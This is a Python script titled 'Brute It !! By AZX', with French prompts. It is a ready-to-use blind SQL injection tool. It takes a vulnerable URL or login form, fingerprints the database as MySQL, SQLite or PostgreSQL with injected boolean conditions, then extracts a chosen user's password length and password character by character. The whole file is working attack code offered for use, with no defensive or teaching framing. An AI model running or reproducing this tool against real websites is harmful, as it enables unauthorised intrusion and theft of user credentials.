#!/usr/bin/python3.5
# -*-coding:Utf-8 -*
import sys
import requests


def DBMS_detect(arg):
    global DBMS
    if arg=="G":
        if DBMS==0: # Detection DBMS
            if(str(requests.get(url+" AND sqlite_version()>0 -- ").content).find(Chaine_success)!=-1):
                DBMS=2
            elif(str(requests.get(url+" AND 'aa'='a'||'a' -- ").content).find(Chaine_success)!=-1):
                DBMS=3
            elif(str(requests.get(url+" AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 -- ").content).find(Chaine_success)!=-1):
                DBMS=1
            else:
                return False
        return True
    else:
        if DBMS==0: # Detection DBMS
            if(str(requests.post(url,data={Champ_user:User+"' AND sqlite_version()>0 -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                DBMS=2
            elif(str(requests.post(url,data={Champ_user:User+"' AND 'aa'='a'||'a' -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                DBMS=3
            elif(str(requests.post(url,data={Champ_user:User+"' AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                DBMS=1
            else:
                return False
        return True

end=True
Url_success=True # URL + Chaine_success Valide
len_passwd=-1
Num_pswd=1
letter=31 # Valeur decimal du tableau ascii
DBMS=0 # 1:Mysql 2:Sqlite3 3:Postgresql
Champ_passwd="password"
Champ_user="username"
User="admin"
password=""
Get_or_Post="N"
print("\nBrute It !! By AZX")
print("\nGet or Post Injection (type G or P) : ",end="")
while Get_or_Post!="G" and Get_or_Post!="P":
    Get_or_Post=input()
while Url_success:
    User_test=input("\nNom de l'utilisateur (Laisser vide si inconnu) : ")
    if(User_test!=""):
        User=User_test;
    Champ_user_test=input("\nNom du champ username (Laisser vide si inconnu) : ")
    if(Champ_user_test!=""):
        Champ_user=Champ_user_test;
    Champ_passwd_test=input("\nNom du champ password (Laisser vide si inconnu) : ")
    if(Champ_passwd_test!=""):
        Champ_passwd=Champ_passwd_test;
    url=input("\nURL vulnérable complete (avec argument sans erreur) : ")
    Chaine_success=input("\nChaine permettant d'identifier un Oui : ")
    try:
        if DBMS_detect(Get_or_Post):
            Url_success=False
        else:
            print("\n\nErreur :\n\nEntrée non valide (pas de retour de la chaine permettant d'identifier un OUI) ou\nDBMS non détecté.\n\nTry again (Y|N) : ",end="")
            if(input()!="Y"):
                sys.exit()
    except :
        print("Erreur :\n\nEntrée non valide (pas de retour de la chaine permettant d'identifier un OUI) ou\nDBMS non détecté.\n\nTry again (Y|N) : ",end="")
        if(input()!="Y"):
            sys.exit()


print("\n\nSTART")
if DBMS==1:
    print("\nDBMS detected : MYSQL\n")
elif DBMS==2:
    print("\nDBMS detected : Sqlite\n")
elif DBMS==3:
    print("\nDBMS detected : Postgresql\n")




# LENGTH PASSWORD
while end:

    len_passwd += 1
    if Get_or_Post=="G":
        if(DBMS!=2):
            send=" AND CHAR_LENGTH("+Champ_passwd+")="+str(len_passwd)+"--"
        else:
            send=" AND LENGTH("+Champ_passwd+")="+str(len_passwd)+"--"

        if(str(requests.get(url+send).content).find(Chaine_success)!=-1):
            end=False
    else:
        if(DBMS!=2):
            send={Champ_user:User+"' AND CHAR_LENGTH("+Champ_passwd+")="+str(len_passwd)+" -- ",Champ_passwd:'Nothing'}
        else:
            send={Champ_user:User+"' AND LENGTH("+Champ_passwd+")="+str(len_passwd)+" -- ",Champ_passwd:'Nothing'}
        if(str(requests.post(url,data=send).content).find(Chaine_success)!=-1):
            end=False

    print("\rLENGTH TRY : "+str(len_passwd),end="")
    if(len_passwd>100):
        print("\r# Arret : Aucun mot de passe trouve #")
        break

    if(end==False):
        print("\rPassword Length User : "+User+" ("+str(len_passwd)+")\n")

# BRUTE PASSWORD
while end==False:

    letter += 1
    if(letter==37): # Cas du LIKE '%'
        letter+=1

    if(letter>126 or Num_pswd>len_passwd):
        print("\n# Arret : Aucun mot de passe trouve #\nletter="+str(letter)+"\nlen_passwd="+str(len_passwd)+"\npassword="+password+"\nNum_pswd="+str(Num_pswd))
        break

    if Get_or_Post=="G":
        if DBMS!=2:
            send=" AND ASCII(SUBSTR("+Champ_passwd+","+str(Num_pswd)+",1)) LIKE ASCII(CHAR("+str(letter)+")) --"
        else:
            send=" AND HEX(SUBSTR("+Champ_passwd+","+str(Num_pswd)+",1)) LIKE HEX(CHAR("+str(letter)+")) --"
        if(str(requests.get(url+send).content).find(Chaine_success)!=-1):
            password +=chr(letter)
            Num_pswd += 1
            letter = 31
    else:
        if(DBMS!=2):
            send={Champ_user:User+"' AND ASCII(SUBSTR("+Champ_passwd+","+str(Num_pswd)+",1)) LIKE ASCII(CHAR("+str(letter)+")) --",Champ_passwd:'Nothing'}
        else:
            send={Champ_user:User+"' AND HEX(SUBSTR("+Champ_passwd+","+str(Num_pswd)+",1)) LIKE HEX(CHAR("+str(letter)+")) --",Champ_passwd:'Nothing'}
        if(str(requests.post(url,data=send).content).find(Chaine_success)!=-1):
            password +=chr(letter)
            Num_pswd +=1
            letter = 31

            if Get_or_Post=="P":
                print("\rPassword "+User+" : "+password+"."*(len_passwd-len(password)),end="")
            else:
                print("\rPassword : "+password+"."*(len_passwd-len(password)),end="")

    if(len(password)==len_passwd):
        if Get_or_Post=="P":
            print("\rPassword "+User+" : "+password)
        else:
            print("\rPassword : "+password)

        end=True
